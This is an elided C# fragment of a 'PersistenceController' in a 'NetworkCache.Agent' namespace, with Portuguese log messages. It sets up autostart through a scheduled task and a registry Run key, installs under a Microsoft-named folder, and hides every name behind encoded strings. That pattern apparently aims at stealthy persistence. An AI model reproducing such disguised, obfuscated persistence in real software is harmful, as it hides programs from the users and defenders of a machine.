...
namespace NetworkCache.Agent
{
    ...
    internal static class PersistenceController
    {
        ...
        public static readonly string TaskName = Enc.S(13);
        public static readonly string RunValueName = Enc.S(14);
        public static readonly string ExeName = Enc.S(12);
        public static readonly string RunKeyPath = Enc.S(20);
        ...
        static string AppDir(bool system)
        {
            ...
            return Path.Combine(root, "Microsoft", Enc.S(15));
        }
        ...
        public static (bool Ok, List<string> Log, string Error) InstallTask(bool system)
        {
            ...
            try
            {
                ...
                if (schedType == null) return (false, log, $"COM {Enc.S(19)} indisponível.");
        ...
        public static (bool Ok, List<string> Log, string Error) RemoveAll()
        {
            ...
            try
            {
                ...
                if (schedType == null)
                {
                    log.Add($"Aviso: COM {Enc.S(19)} indisponível — tarefa não verificada.");
                }
                else
                {
                    dynamic scheduler = Activator.CreateInstance(schedType)!;
